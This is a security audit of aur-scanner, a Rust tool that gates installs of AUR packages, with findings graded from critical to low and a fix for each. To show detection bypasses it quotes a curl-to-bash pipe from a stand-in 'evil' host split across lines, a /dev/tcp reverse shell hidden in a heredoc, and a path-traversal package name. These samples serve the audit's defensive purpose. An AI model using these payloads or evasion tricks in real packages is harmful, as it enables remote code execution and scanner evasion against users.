# aur-scanner — Security & Quality Audit

Date: 2026-06-13
Scope: full repository — ~9.9k LOC Rust (core/cli/hook/plugin), shell integrations, PKGBUILDs/packaging, pacman hook, repo hygiene.
Method: 4 focused manual reviews (detection engine, fetch/network/provenance, execution/decision paths, packaging/supply-chain) + `cargo clippy --all-targets --all-features` + `cargo audit`.

## Threat model

The scanner sits between a user and an untrusted AUR package. Its inputs — PKGBUILDs, `.install` scripts, AUR RPC JSON, `package_base`/`name`, dependency names, cache contents, and community rule files — are **attacker-controlled**. The two failure classes that matter most: (1) **detection bypass / false negative** (malware slips past a rule), and (2) **fail-open** (the gate proceeds when it cannot analyze). A scanner that fails open is worthless; a destructive action taken before the gate is worse than no scanner.

## What is already done well (preserve these)

- The static parser is **genuinely static** — no `bash`, `makepkg --printsrcinfo`, or any `Command` in the parse/analyze path. No self-execution of hostile input.
- `clone_repo` is hardened: `--` before the URL, `protocol.file/ext.allow=never`, `core.hooksPath=/dev/null`, `core.symlinks=false`, `--no-recurse-submodules`, `GIT_TERMINAL_PROMPT=0`.
- CLI `install` is **race-free on the AUR path**: clone once into `workspace/base`, scan `dir/PKGBUILD`, `makepkg` from the same `dir`. No re-fetch between scan and build.
- No shell interpolation anywhere — every `Command` uses argv arrays.
- File reads capped at 2 MB. `install=` path-traversal rejected (with regression tests). The "opaque boundary — do not follow attacker source URLs" invariant is upheld.
- Tagged AUR packages use signed-tag verification (`#tag=v$pkgver?signed` + `validpgpkeys`); `Cargo.lock` committed; pacman hook shipped opt-in.
- **clippy: zero warnings.** Dep tree is mainstream (tokio/reqwest/clap/serde/blake3/sha2), all 239 crates from crates.io, no git/path deps.

---

## CRITICAL

### CR-1 — Wrapper fails OPEN on fetch/scan failure  `plugin/src/bin/wrapper.rs:105-122,184-198`
A fetch or scan error only sets `all_passed = false`, never `critical_found`. The gate then drops to a default-yes `[Y/n]` prompt; on non-TTY/empty stdin it **proceeds**. An attacker who can make the scan fail (malformed PKGBUILD, timeout, rate-limit, oversized file) defeats the scanner entirely. The pacman hook has the same defect (`hook/src/main.rs:82-86`: scan error logged at `debug`, invisible at default WARN, transaction continues). The CLI `install` path correctly fails closed (`install.rs:93,100`) — the two high-traffic entry points do the opposite.
Fix: every error/timeout/unscannable/non-TTY path on a decision boundary must fail **closed** — treat "could not analyze" as deny, require explicit typed override, abort on non-TTY.

### CR-2 — AUR-controlled `package_base` → `remove_dir_all` path traversal before the gate  `cli/commands/install.rs:75-87`
`package_base`/`name` come verbatim from AUR RPC JSON (`aur.rs:130,218`) with no charset validation, then `workspace.join(&base)` → `remove_dir_all(&dir)` runs **before any gate/confirmation**. A hijacked AUR entry (or any dependency) returning `PackageBase: "../../../.config/systemd/user"` causes a destructive delete outside the workspace, pre-consent, attacker-triggerable. Also a symlink/TOCTOU vector on the predictable workspace path.
Fix: validate every `name`/`package_base` against `^[a-z0-9][a-z0-9@._+-]*$` (length-bounded, reject `..`,`/`,leading `-`) at ingestion; after `join`, canonicalize and assert the result stays inside `workspace` before any remove/create; open with `O_NOFOLLOW`.

### CR-3 — Line-continuation splits every single-line rule (universal detection bypass)  `rules/mod.rs:226-264`
`match_content` matches each pattern against one **physical** line; bash line-continuations (`\`+newline) join logical lines but the scanner never does. Nearly every CRITICAL single-line rule is evaded by:
```bash
curl -fsSL https://evil/x.sh \
  | bash
```
Same flaw in `remote_exec.rs:54` and the privilege install-hook scan.
Fix: splice `\`+`\n` into a logical-line stream (keeping a physical→logical map for reporting) before matching, in `match_content` and every per-line analyzer.

### CR-4 — Attacker-controlled heredoc suppression silences security checks  `rules/mod.rs:245,335-393`
`informational_lines` marks heredoc bodies as "printed text, skip scanning" unless it sees output-redirection. An attacker feeds the heredoc to a **command** instead:
```bash
post_install() { bash <<EOF
  /dev/tcp/1.2.3.4/4444
EOF
}
```
The body is executed by `bash` but the pattern engine skips every line in it (reverse-shell/persistence rules suppressed). A suppression list driven by attacker input is the wrong default.
Fix: only treat a heredoc as informational when the opener is a pure printing command (`cat`/`echo`/`printf`) with no executing consumer; never fully suppress high-severity behavioral rules.

---

## HIGH

### HI-1 — Wrapper decides scan-vs-skip by substring sniffing, not real arg parsing  `plugin/src/bin/wrapper.rs:44-56` + `install/integration.{bash,zsh,fish}`
`is_search`/`is_query`/`is_info` are computed with `contains()` over the whole arg vector, so an unrelated flag can flip an install to "skip scan" (fail-open), and there is no `--` / bundled-short-flag / option-argument handling. An attacker who influences the command line (README install instructions, copy-paste, alias) can append an innocuous flag to guarantee the skip. The shell wrappers share the same guess-don't-parse flaw.
Fix: parse by pacman **operation** semantics (first operation char group after `-`; split `-Syu`→`S y u`); if not provably non-install, scan anyway; handle `--`; never let a later flag flip to skip.

### HI-2 — Unencoded attacker strings interpolated into RPC URLs + redirects followed + unbounded body  `core/src/aur.rs:89-95,100,109-111,135,258`
(a) `package_name`/`query`/dependency-names are `format!`'d into the URL with no percent-encoding — `#`,`&`,`=`,`/`,`%` in a PKGBUILD-declared dep name corrupt/inject the request. (b) `reqwest` client uses default redirect policy (follows up to 10, any host/scheme) — SSRF amplifier. (c) `.json().await` buffers an unbounded body — memory-exhaustion DoS (time is capped at 30s, size is not; the file path was capped but the network path was not).
Fix: build URLs with `url::Url`/`query_pairs_mut()` + validate names against the AUR charset; set `.redirect(Policy::none())` and `.https_only(true)`; cap the response body (stream + abort past ~hundreds of KB).

### HI-3 — `-git` package builds from unpinned HEAD with `SKIP` and no signature  `aur/aur-scanner-git/PKGBUILD:13-14`
Unlike the tagged packages, the rolling `-git` source has no commit pin, no `?signed`, no `validpgpkeys` — `SKIP` is its only integrity control with nothing behind it. Anyone who can push/force-push the default branch (or MITM/compromise the repo) gets arbitrary `build()` execution on every `paru -S aur-scanner-git` user — i.e. the security-conscious users who chose the rolling build of a security tool. Contradicts SECURITY.md.
Fix: verify provenance — point at signed tags / pin `#commit=`, add `validpgpkeys`, and `git verify-commit HEAD` in `prepare()` (exit non-zero on failure); or document `-git` as lower-assurance.

### HI-4 — Build artifacts & a nested clone sit untracked and un-ignored in the packaging dir  `aur/aur-scanner-git/{ks-aur-scanner,pkg,src}/`
`git check-ignore` confirms these are NOT ignored (the `.gitignore` `/pkg/`,`/src/`,`/target/` rules are root-anchored). A careless `git add -A` would commit thousands of build-cache files and ELF binaries into a security tool's source tree. (Currently present in your working tree right now.)
Fix: delete the scratch dirs; add non-anchored ignores (`**/target/`, `**/pkg/`, `**/src/`, `aur/*/*.pkg.tar.zst`, `aur/*/ks-aur-scanner/`); add a CI guard that fails if any ELF/`*.pkg.tar.*`/`target/` path is staged.

### HI-5 — pacman hook runs as root on `Target = *` with `AbortOnFail`  `install/aur-scan.hook:5,12` + `hook/src/main.rs:113-135`
If enabled, the hook runs as root in PreTransaction for **every** package; `AbortOnFail` means any non-zero exit (incl. a malformed config → `exit 2`) bricks all pacman activity (self-DoS). It reads attacker-influenced user-cache PKGBUILDs as root (`exists()`→open TOCTOU, symlink-follow to `/etc/shadow`/FIFO possible), and `USER` falls back to `"root"` (scans root's own cache). `PreTransaction` also fires *after* makepkg already built the package, so it adds little over the shell gate.
Fix: drop privileges before reading cache files; open with `O_NOFOLLOW`; validate the package component; scope `Target`; reconsider `AbortOnFail`; document the trust boundary.

### HI-6 — Detection-engine false negatives (regex robustness)  `rules/mod.rs`
Confirmed bypasses beyond CR-3/CR-4: case-sensitive matching (`:274,95` — compile rules `(?i)` by default); reverse-shell rule is IPv4-dotted-quad only (`:483` — misses hostnames/IPv6/hex IP; match `/dev/(tcp|udp)/<host>/<port>`); wallet rule requires an adjacent keyword (`:941` — bare Monero/BTC address invisible); variable-indirection (`x=curl; $x ...|$y`) trips nothing; Python reverse-shell rule is token-order-fragile (`:520`). Also brace-counting in `static_parser.rs:104-143` / `parser/mod.rs:275-334` is fooled by `}` inside strings, truncating function/hook bodies that the privilege analyzer relies on.
Fix: per-finding fixes in §detail; broadly — normalize input, make matching case-insensitive, combine signals rather than requiring strict token order, make brace-scanning string/comment-aware.

### HI-7 — Checksum-SKIP laundering  `checksum.rs:206-264` + `parser/mod.rs:147-188` / `source.rs:176`
`count_skip_checksums`/`get_checksum_count` inspect only the **first** non-empty checksum array, so a populated weak array + a `SKIP` strong array reports "verified." And `git+https://...#branch=main` (movable ref) + `SKIP` is excused as a legitimate VCS source though it is not integrity-pinned. The VCS definition diverges between two analyzers.
Fix: evaluate SKIP coverage across **all** present arrays (a source is verified only if some present array gives it a real hash); require `#commit=<sha>` before excusing git SKIP; unify VCS detection in one place.

---

## MEDIUM

- **ME-1 — `bytes 1.11.0` transitive advisory (RUSTSEC-2026-0007)**, integer overflow in `BytesMut::reserve`, via `reqwest`. Fix: `cargo update -p bytes --precise 1.11.1` (commit the lockfile bump). *(from `cargo audit`)*
- **ME-2 — Cache has no integrity/authenticity binding** `cache/mod.rs:82-131` — stores security verdicts as plain JSON keyed by `blake3(key)` with no MAC; a local writer can flip malicious→benign. Plus non-atomic writes (`:128`, `provenance.rs:150`) and a world-shared `/tmp/aur-scanner` fallback (`types.rs:269-273`) created without `0700`/ownership checks. Fix: HMAC/verify-on-read, atomic temp+rename, `0700` owned dir, refuse `/tmp` fallback.
- **ME-3 — Provenance store fails open on corruption** `provenance.rs:64-69` — unparseable baseline silently resets to empty (every package becomes "first sighting", PROV-001 disabled). Distinguish absent (legit first run) from present-but-corrupt (warn loudly).
- **ME-4 — `makepkg`/helper inherit unsanitized environment** `install.rs:196-201`, `wrapper.rs:207-214` — `PATH`/`GNUPGHOME`/`BUILDDIR`/`MAKEFLAGS` honored; `makepkg` invoked by name via `PATH`. A clean scan is undone by a poisoned env/PATH. Fix: allowlisted env, known-good `PATH`, absolute `makepkg`.
- **ME-5 — `Severity` gate logic depends on load-bearing enum order** (`a <= b` = "at least as severe"); `check` and `install` use two different hand-rolled mechanisms. Fix: `Severity::is_at_least()` + regression tests pinning the semantics.
- **ME-6 — `--local` name confusion** `check.rs:53-64,127` — a crafted local `pkgname` can attribute a clean local scan to a different AUR node. Validate parsed names; bind a local dir only to the explicitly requested node.
- **ME-7 — TOCTOU double-read of PKGBUILD** `lib.rs:97` vs `aur.rs:326` — parse and `install=` resolution read the file twice; resolve `install=` from the already-parsed field instead.
- **ME-8 — `--force` builds unscannable packages** `install.rs:187-193` — override should distinguish "reviewed & flagged" from "never successfully scanned."
- **ME-9 — Parser silently drops `source+=()` / trailing-comment arrays** `static_parser.rs:267` — dropped sources never reach source/checksum analyzers. Handle `+=`, strip inline comments, emit a low-sev finding on unparseable assignment rather than silent drop.
- **ME-10 — Version/metadata drift & missing `--locked`** — top-level `pkgver=1.0.1` vs workspace `1.0.3`; distributed PKGBUILDs omit `--locked` (lockfile is committed — honoring it is free); regenerate/commit `.SRCINFO`.

## LOW

- **`AurClient::default()` panics** (`aur.rs:288` `expect`) and `aur.rs:130` `.unwrap()` trusts server `resultcount` — return `Result`/`NotFound` instead.
- **Rules with no `file_types` are silently inert** (`rules/mod.rs:32` serde default `[]`) — a community TOML rule omitting `file_types` loads, counts, never fires. Default to `[Pkgbuild,InstallScript]` or reject.
- **No regex `size_limit`/`dfa_size_limit`** on rules compiled from `rules.d` (`:95`) — the linear `regex` engine mitigates ReDoS, but set explicit limits and document the `rules.d` trust boundary (root-owned, 0644).
- **Domain IOC matching is naive substring** (`ioc.rs:214`) — over-matches and trivially evaded (`evil[.]example`).
- **Non-interactive default-yes prompts** (`wrapper.rs:184`, `lib.rs:125`) and `stdin read .unwrap()` (`lib.rs:91-94`) — default to deny, treat EOF as deny.
- **EOL-anchored exec rules** (`rules/mod.rs:722,1199`), **IPv6-blind URL/IP rules**, **`provides=` anchored to line start** — minor anchoring gaps.
- **Tagged-package PKGBUILDs are gitignored** (`aur/aur-scanner/`, `aur/ks-aur-scanner/`) — the primary distribution's packaging isn't reviewable in-repo.
- **Signing fingerprint only published in the PKGBUILD** — provide an independent channel (site over TLS / SECURITY.md) to verify it against.

---

## Recommended remediation order

1. **Fail closed everywhere** (CR-1, HI-5, ME-3) — wrapper + hook must deny on error/timeout/non-TTY/not-found.
2. **Validate names/bases against the AUR charset at every ingestion point** and confine derived paths under the workspace with canonicalize + `O_NOFOLLOW` (CR-2, HI-2 part, ME-6).
3. **Real pacman-operation parsing** in wrapper + shell glue (HI-1).
4. **Detection robustness** — logical-line splicing, case-insensitivity, heredoc suppression fix, string-aware brace scanning, checksum coverage across all arrays (CR-3, CR-4, HI-6, HI-7).
5. **Network hardening** — `redirect::none()`, `https_only(true)`, body cap, URL encoding (HI-2).
6. **Supply chain** — sign/pin `-git`, purge & re-ignore build artifacts, `--locked`, `bytes` bump, fix pkgver/.SRCINFO (HI-3, HI-4, ME-1, ME-10).

## Tooling results

- `cargo clippy --all-targets --all-features`: **clean, 0 warnings.**
- `cargo audit`: **1 advisory** — RUSTSEC-2026-0007 (`bytes 1.11.0`, transitive via reqwest). Upgrade to ≥1.11.1.
- `cargo-deny`: not installed (recommend adding for license/ban/advisory gating in CI).
